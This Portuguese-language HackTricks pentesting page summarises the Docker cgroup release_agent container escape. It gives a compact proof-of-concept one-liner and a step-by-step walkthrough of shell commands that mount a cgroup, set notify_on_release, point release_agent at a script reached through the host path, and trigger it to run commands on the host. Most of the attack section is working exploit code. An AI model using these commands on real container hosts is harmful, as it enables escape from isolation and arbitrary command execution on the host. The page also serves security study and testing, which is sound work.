# Docker release\_agent cgroups escape

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}


**Para mais detalhes, consulte o** [**post original do blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Este é apenas um resumo:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
A prova de conceito (PoC) demonstra um método para explorar cgroups criando um arquivo `release_agent` e acionando sua invocação para executar comandos arbitrários no host do contêiner. Aqui está uma divisão dos passos envolvidos:

1. **Preparar o Ambiente:**
* Um diretório `/tmp/cgrp` é criado para servir como um ponto de montagem para o cgroup.
* O controlador de cgroup RDMA é montado neste diretório. Em caso de ausência do controlador RDMA, sugere-se usar o controlador de cgroup `memory` como alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Configurar o Cgroup Filho:**
* Um cgroup filho chamado "x" é criado dentro do diretório cgroup montado.
* As notificações são ativadas para o cgroup "x" escrevendo 1 em seu arquivo notify\_on\_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurar o Release Agent:**
* O caminho do contêiner no host é obtido a partir do arquivo /etc/mtab.
* O arquivo release\_agent do cgroup é então configurado para executar um script chamado /cmd localizado no caminho do host adquirido.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Criar e Configurar o Script /cmd:**
* O script /cmd é criado dentro do contêiner e é configurado para executar ps aux, redirecionando a saída para um arquivo chamado /output no contêiner. O caminho completo de /output no host é especificado.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Acionar o Ataque:**
* Um processo é iniciado dentro do cgroup filho "x" e é imediatamente terminado.
* Isso aciona o `release_agent` (o script /cmd), que executa ps aux no host e grava a saída em /output dentro do contêiner.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
